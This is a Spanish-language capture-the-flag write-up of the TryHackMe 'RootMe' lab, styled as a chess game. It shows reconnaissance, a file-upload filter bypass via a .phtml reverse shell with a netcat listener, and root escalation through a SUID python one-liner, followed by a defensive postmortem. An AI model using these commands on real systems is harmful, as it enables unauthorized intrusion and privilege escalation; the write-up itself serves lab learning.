```
♟ PARTIDA 001
  ROOTME
  TryHackMe · Easy
```

```bash
$ whoami
> t474_r0b07

$ cat /etc/context
> vengo de overthewire.
> sé lo que es pelear una posición.
> esto no va a ser eso.
```

---

## `> ♟ APERTURA: lectura del tablero`

```bash
$ cat first_impression.txt
> la sala ya traía los guiones.
> el sistema no estaba defendido.
> estaba etiquetado.
```

> RootMe es una máquina de principiantes. No lo digo como crítica: lo digo como contexto. Llego aquí después de OverTheWire. Sé la diferencia entre una posición que se defiende y una que ya llegó rendida. Esta llegó rendida. Lo interesante no es si se puede rootear. Lo interesante es entender exactamente cuándo y por qué el sistema perdió.

---

## `> ♞ PIEZA EXPUESTA: reconocimiento`

```bash
$ nmap -sV -sC -O <IP>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6
80/tcp open  http    Apache 2.4.29
```

> Dos puertos. SSH en reserva: nadie ataca por ahí primero en una máquina así. El peso está en el 80. Apache corriendo. La partida empieza en el navegador.

```bash
$ gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt

/panel/      (Status: 200)
/uploads/    (Status: 200)
```

> Curioso.
>
> `/panel/` sin autenticación. `/uploads/` accesible. El sistema acaba de mostrar sus piezas sin que se lo pidiera. Un formulario de carga expuesto no es una vulnerabilidad. Es una decisión. Alguien decidió que esto era aceptable.

---

## `> ♝ HIPÓTESIS: línea de juego`

```bash
$ cat hypothesis.txt
> formulario de carga sin auth
> filtro por extensión .php
> pregunta: ¿qué tan serio es ese filtro?
```

> Los filtros por extensión son promesas. Rara vez se cumplen del todo. La pregunta no es si hay filtro: es qué tan lejos llega.

---

## `> ♜ INICIATIVA: ruptura`

```bash
$ mv shell.php shell.phtml
$ # subir via /panel/
$ nc -lvnp 1234
```

> El filtro bloqueaba `.php`. No bloqueaba `.phtml`. El servidor interpretó el archivo de todas formas. La promesa no se cumplió.
>
> Conexión establecida.

```bash
$ cat /var/www/user.txt
> THM{[REDACTED]}
```

> Bandera de usuario. La posición del sistema ya estaba perdida desde que alguien instaló ese formulario sin validar extensiones reales. El filtro era decorativo.

---

## `> ♛ REY EXPUESTO: escalada`

```bash
$ find / -perm -u=s -type f 2>/dev/null

/usr/bin/python
```

> Eso no debería estar ahí.
>
> Un intérprete con SUID activo es una llave maestra. No requiere exploits. No requiere CVEs. Solo requiere saber leer lo que el sistema dejó abierto.

```bash
$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
$ whoami
> root
```

---

## `> ♚ JAQUE MATE`

```bash
$ cat /root/root.txt
> THM{[REDACTED]}
```

> Hecho.

---

## `> ♜ ANÁLISIS DE LA PARTIDA: ¿dónde perdió el rey?`

```bash
$ cat postmortem.txt

MOVIMIENTO 1: formulario de carga sin autenticación
MOVIMIENTO 2: filtro de extensión por nombre, no por contenido
MOVIMIENTO 3: python con SUID activo en producción
```

> El sistema no perdió cuando subí el archivo. Perdió cuando alguien tomó tres decisiones malas y pensó que ninguna importaba por separado.
>
> El filtro de extensión daba falsa seguridad. El SUID en Python era descuido. La combinación era inevitable.
>
> Root no fue el movimiento ganador. Fue la consecuencia.

```bash
$ echo $LESSON
> un filtro que no valida contenido no es un filtro.
> es una ilusión de control.
```

---

> *partida 001 · rootme · jaque mate confirmado*
> *→ [t474-r0b07](https://github.com/t474-r0b07)*

<!--
  la posición ya estaba perdida.
  root fue solo la última jugada.
-->
